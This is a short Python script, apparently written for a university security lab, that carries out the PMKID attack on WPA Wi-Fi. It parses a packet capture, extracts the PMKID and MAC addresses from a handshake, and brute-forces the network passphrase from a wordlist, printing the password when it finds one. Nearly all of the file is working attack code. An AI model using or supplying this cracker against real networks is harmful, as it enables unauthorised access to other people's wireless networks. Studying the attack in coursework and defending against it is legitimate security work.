#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Auteurs: David Gallay, Jean Gachet, Yanick Thomann
Date: 03/05/2023

This script is used to crack a WPA password using the PMKID attack.
It parses a pcap file passed as commandline argument (-c/--pcap) and checks for SSIDs
It also takes a wordlist (-w/--wordlist) used for bruteforcing the wifi password

Script utilisé pour cracker un mot de passe WPA avec l'attaque sur PMKID
Il parcourt un fichier pcap (-c/--pcap) et cherche des SSID annoncant un PMKID
Il utilise une list de mots (-w/--wordlist) pour bruteforcer le mot de passe du Wifi

"""


from scapy.all import *
from pbkdf2 import *
import argparse

from custom_tools import get_next_line_from_file, get_ssids_and_handshakes


# Function to calculate PMKID
def make_pmkid(ap_mac, client_mac, ssid, passphrase):
    ap_mac = ap_mac.lower().replace(":", "")
    client_mac = client_mac.lower().replace(":", "")
    ssid = ssid.encode()
    pmk = hashlib.pbkdf2_hmac('sha1', passphrase.encode(), ssid, 4096, 32)
    pmkid = hmac.new(pmk, b"PMK Name" + bytes.fromhex(ap_mac) + bytes.fromhex(client_mac), hashlib.sha1).hexdigest()[:32]
    return pmkid


if __name__ == '__main__':

    # Argument handling
    parser = argparse.ArgumentParser(description='Process .pcap file and wordlist file')
    parser.add_argument('-c', '--pcap', type=str, required=True,help='path to .pcap file')
    parser.add_argument('-w', '--wordlist', type=str, required=True,help='path to wordlist file')

    args = parser.parse_args()

    pcap = args.pcap
    wordlist = args.wordlist

    # Read pcap
    wpa = rdpcap(pcap)

    ssids, pmkids = get_ssids_and_handshakes(wpa, True)

    for ssid in ssids:
        if ssid not in pmkids:
            break

        print("----- Start hacking of {} -----".format(ssid))
        pmkid_pkt = pmkids[ssid]  # we assume that the message contains a PMKID (ok with Mr A. Rubinstein)

        # getting AP and client MAC from message 1
        ap_mac = pmkid_pkt[0].addr2
        client_mac = pmkid_pkt[0].addr1

        # retrieve the PMKID from the 1st packet of a 4-way handshake to check bruteforce against
        pmkid_to_check = pmkid_pkt[EAPOL].load[-16:].hex()

        # Read wordlist line by line
        passphrase_found = False
        for passphrase in get_next_line_from_file(wordlist):
            # Calculate the PMKID for the given password
            pmkid_for_line = make_pmkid(ap_mac, client_mac, ssid, passphrase)

            if pmkid_for_line == pmkid_to_check:
                passphrase_found = True
                print(f'WPA Password is : {passphrase}')
                break

        if not passphrase_found:
            print('No matching password found in wordlist')
